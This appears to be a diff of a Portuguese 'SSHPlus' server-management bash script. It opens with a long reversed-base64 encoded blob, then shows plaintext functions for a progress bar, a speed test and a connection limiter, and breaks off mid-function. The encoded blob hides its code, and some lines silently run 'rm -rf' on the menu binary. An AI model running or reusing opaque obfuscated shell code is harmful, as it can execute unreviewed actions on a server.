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HIliHIliHIliHIliHIliHIliHIliHIliHIliHIliHIliHIliHIliHIliHIliHIliHIliDIliTZli3mNzsDMbNzMwwlIgUWLg8GajVmCgACIgUWLg8GajVmC0F2Ys9GbgwHIioQkWKekWKekWKekWKekWKOhWKOiWKOhWKukWKekWKOhWKOhWKOiWKOkWKekWKOjWKOiWKOiWKukWKekWKOiWKOiWKukWKOgWKOiWKOhWKOiWKOkWKekWKOhWKOhWKOiWKOkWKekWKOhWKOhWKOiWKOkWKekWKekWKekWKOiWKOkWKukWKOgWKOiWKOhWKOhWKOiWKukWKuCRap4Rap4Rap4Rap4Rap4Rap4Iap4Sap4Rap4Rap4Aap4Aap4Iap4Qap4Rap4Rap4Iap4Sap4Iap4Sap4Iap4Qap4Sap4Iap4Qap4Map4Iap4Qap4Rap4Aap4Aap4Iap4Qap4Rap4Aap4Aap4Iap4Qap4Rap4Iap4Eap4Iap4Qap4Sap4Eap4Eap4Iap4Aap4Aap4Sap4KEpliHpliHpliHplijoliDolijoliDolijoliLpliDoliDolijoliDpliHplizolijoliLpliHpliTolijolijoliLpliTolijoliDolijoliDpliHpliDoliDolijoliDpliHpliDoliDolijoliDpliHplijoliDolijoliDpliLplijoliDoliDolijoliToliLplirAIiAyboNWZKIXYlx2YKkiIp03JzQCI05WayB3J7Bya3FGI8BCchd3cgkWLgAXZydGI8BCatASZlJnZoQiIgcyc10SJnAiZ05WayBHKk0zMwF2dzpQKikSfnQDJgQnbpJHcnsHIrdXYgwHIwF2dzBSatACclJ3ZgwHIo1CIlVmcmhCJiAyJzVTLlcCImRnbpJHcoQSPyAXY3NnCpISK9diMkACdulmcwdyegs2dhBCfgAXY3NHIp1CIwVmcnBCfggWLgUWZyZGKkICInMXNtUyJgYGdulmcwhCJ9EDchd3cKkiIpwWLgM2dgwHI5R2bi9mbgYXLgAXZydGI8BCZ3N3chB3LjRXZvAyJ9FDJgQnbpJHc7BCMwATM94zMkcCI6YULgs2dhhCJiAyJzVTLlcCImRnbpJHcoQSPyV2c1R3XKkiIyV2c1BHel9FJiAyJzVTLlcCImRnbpJHco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
+#!/bin/bash
+fun_bar () {
+comando[0]="$1"
+comando[1]="$2"
+ (
+[[ -e $HOME/fim ]] && rm $HOME/fim
+[[ ! -e /usr/lib/sshplus ]] && rm -rf /bin/menu > /dev/null 2>&1
+${comando[0]} -y > /dev/null 2>&1
+${comando[1]} -y > /dev/null 2>&1
+touch $HOME/fim
+ ) > /dev/null 2>&1 &
+ tput civis
+echo -ne "\033[1;33m["
+while true; do
+   for((i=0; i<18; i++)); do
+   echo -ne "\033[1;31m#"
+   sleep 0.1s
+   done
+   [[ -e $HOME/fim ]] && rm $HOME/fim && break
+   echo -e "\033[1;33m]"
+   sleep 1s
+   tput cuu1
+   tput dl1
+   echo -ne "\033[1;33m["
+done
+echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
+tput cnorm
+}
+IP=$(cat /etc/IP)
+x="ok"
+menu ()
+{
+velocity () {
+aguarde () {
+comando[0]="$1"
+comando[1]="$2"
+ (
+[[ -e $HOME/fim ]] && rm $HOME/fim
+[[ ! -d /etc/SSHPlus ]] && rm -rf /bin/menu
+${comando[0]} > /dev/null 2>&1
+${comando[1]} > /dev/null 2>&1
+touch $HOME/fim
+ ) > /dev/null 2>&1 &
+ tput civis
+echo -ne "  \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
+while true; do
+   for((i=0; i<18; i++)); do
+   echo -ne "\033[1;31m#"
+   sleep 0.1s
+   done
+   [[ -e $HOME/fim ]] && rm $HOME/fim && break
+   echo -e "\033[1;33m]"
+   sleep 1s
+   tput cuu1
+   tput dl1
+   echo -ne "  \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
+done
+echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
+tput cnorm
+}
+fun_tst () {
+speedtest --share > speed
+}
+echo -e "\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "   \033[1;32mTESTANDO A VELOCIDADE DO SERVIDOR !\033[0m"
+echo -e "\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+aguarde 'fun_tst'
+echo ""
+png=$(cat speed | sed -n '5 p' |awk -F : {'print $NF'})
+down=$(cat speed | sed -n '7 p' |awk -F :  {'print $NF'})
+upl=$(cat speed | sed -n '9 p' |awk -F :  {'print $NF'})
+lnk=$(cat speed | sed -n '10 p' |awk {'print $NF'})
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\033[1;32mPING (LATENCIA):\033[1;37m$png"
+echo -e "\033[1;32mDOWNLOAD:\033[1;37m$down"
+echo -e "\033[1;32mUPLOAD:\033[1;37m$upl"
+echo -e "\033[1;32mLINK: \033[1;36m$lnk\033[0m"
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+rm -rf $HOME/speed
+}
+#limiter
+function limit1 () {
+   clear
+   echo -e "\n\033[1;32mINICIANDO O LIMITER... \033[0m"
+   echo ""
+   fun_bar 'screen -dmS limiter limiter' 'sleep 3'
